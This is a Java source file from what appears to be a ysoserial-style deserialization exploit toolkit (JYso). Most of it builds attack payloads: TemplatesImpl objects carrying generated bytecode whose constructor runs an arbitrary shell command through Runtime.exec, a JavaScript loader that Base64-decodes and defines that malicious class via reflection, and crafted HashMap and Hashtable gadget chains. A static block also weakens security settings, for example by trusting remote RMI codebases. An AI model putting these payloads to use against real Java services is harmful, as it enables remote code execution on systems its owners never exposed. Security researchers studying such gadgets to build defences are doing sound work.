package com.qi4l.JYso.gadgets.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.CtClass;
import javassist.CtConstructor;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static com.qi4l.JYso.gadgets.Config.Config.*;
import static com.qi4l.JYso.gadgets.utils.Utils.saveCtClassToFile;
import static com.qi4l.JYso.gadgets.utils.Utils.writeClassToFile;
import static com.qi4l.JYso.gadgets.utils.handle.ClassFieldHandler.insertField;
import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertCMD;
import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.generateClass;
import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;
import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

public class Gadgets extends ClassLoader {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    public static Class TPL_CLASS = TemplatesImpl.class;
    public static Class ABST_TRANSLET = AbstractTranslet.class;
    public static Class TRANS_FACTORY = TransformerFactoryImpl.class;

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");

        try {
            // 兼容不同 JDK 版本
            if (Boolean.parseBoolean(System.getProperty("properXalan", "false")) || FORCE_USING_ORG_APACHE_TEMPLATESIMPL) {
                TPL_CLASS = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
                ABST_TRANSLET = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                TRANS_FACTORY = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
            }
        } catch (Exception ignored) {
        }
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        CtClass ctClass      = null;
        byte[]  classBytes   = new byte[0];
        String  newClassName = generateClassName();

        final Object templates = TPL_CLASS.newInstance();
        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
        CtClass superClass = POOL.get(ABST_TRANSLET.getName());

        // 扩展功能
        if (command.startsWith("EX-") || command.startsWith("LF-")) {
            ctClass = generateClass(command, newClassName);
        } else {
            // 普通的命令执行
            if (IS_OBSCURE) {
                ctClass = POOL.makeClass(newClassName);
                insertCMD(ctClass);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            } else {
                // 最短化
                ctClass = POOL.makeClass(newClassName);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            }
        }

        // 如果全局配置继承，再设置父类
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            shrinkBytes(ctClass);

            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
            if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
            } else {
                // 否则直接设置父类
                ctClass.defrost();
                ctClass.setSuperclass(superClass);
            }
        }

        // 按需保存文件
        saveCtClassToFile(ctClass);
        classBytes = ctClass.toBytecode();

        // 加载 class 试试
//		loadClassTest(classBytes, ctClass.getName());

        // 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
        classBytes[7] = 49;

        // 恶意类是否继承 AbstractTranslet
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        } else {
            CtClass newClass = POOL.makeClass(generateClassName());
            insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");

            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
            // 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
            Reflections.setFieldValue(templates, "_transletIndex", 0);
        }

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "anyStr");
        Reflections.setFieldValue(templates, "_tfactory", TRANS_FACTORY.newInstance());
        return templates;
    }

    public static String createClassT(String command) throws Exception {
        command = command.trim();

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        CtClass ctClass      = null;
        byte[]  classBytes   = new byte[0];
        String  newClassName = generateClassName();

        final Object templates = TPL_CLASS.newInstance();
        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
        CtClass superClass = POOL.get(ABST_TRANSLET.getName());

        // 扩展功能
        if (command.startsWith("EX-") || command.startsWith("LF-")) {
            ctClass = generateClass(command, newClassName);
        } else {
            // 普通的命令执行
            if (IS_OBSCURE) {
                ctClass = POOL.makeClass(newClassName);
                insertCMD(ctClass);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            } else {
                // 最短化
                ctClass = POOL.makeClass(newClassName);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            }
        }

        // 如果全局配置继承，再设置父类
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            shrinkBytes(ctClass);

            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
            if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
            } else {
                // 否则直接设置父类
                ctClass.defrost();
                ctClass.setSuperclass(superClass);
            }
        }

        byte[] bytes = ctClass.toBytecode();
        String classCode = Base64.getEncoder().encodeToString(bytes);
        //System.out.println("Base64 Encoded CtClass: " + classCode);
        ctClass.detach();

        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + ctClass.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";
    }

    public static String createClassB(String command) throws Exception {
        command = command.trim();

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        CtClass ctClass      = null;
        byte[]  classBytes   = new byte[0];
        String  newClassName = generateClassName();

        final Object templates = TPL_CLASS.newInstance();
        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
        CtClass superClass = POOL.get(ABST_TRANSLET.getName());

        // 扩展功能
        if (command.startsWith("EX-") || command.startsWith("LF-")) {
            ctClass = generateClass(command, newClassName);
        } else {
            // 普通的命令执行
            if (IS_OBSCURE) {
                ctClass = POOL.makeClass(newClassName);
                insertCMD(ctClass);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            } else {
                // 最短化
                ctClass = POOL.makeClass(newClassName);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            }
        }

        // 如果全局配置继承，再设置父类
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            shrinkBytes(ctClass);

            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
            if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
            } else {
                // 否则直接设置父类
                ctClass.defrost();
                ctClass.setSuperclass(superClass);
            }
        }

        String className = ctClass.getName();
        writeClassToFile(className, ctClass.toBytecode());

        return className;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public Class<?> defineClass(String name, byte[] bytecode) {
        return defineClass(name, bytecode, 0, bytecode.length);
    }
    public static Hashtable makeTableTstring(Object o) throws Exception{
        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        tHashMap1.put(o,"Unam4");
        tHashMap2.put(o,"SpringKill");
        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
        Reflections.setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,"Unam4");
        hashtable.put(tHashMap2,"SpringKill");

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }
    public static HashMap maskmapToString(Object o1, Object o2) throws Exception{
        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        tHashMap1.put(o1,null);
        tHashMap2.put(o2,null);
        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
        Reflections.setFieldValue(tHashMap2,"loadFactor",1);
        HashMap hashMap = new HashMap();
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, tHashMap1, "Unam4", null);
        Object node2 = constructor.newInstance(0, tHashMap2, "SpringKill", null);
        Reflections.setFieldValue(hashMap, "size", 2);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        Reflections.setFieldValue(hashMap, "table", arr);
        return hashMap;
    }
}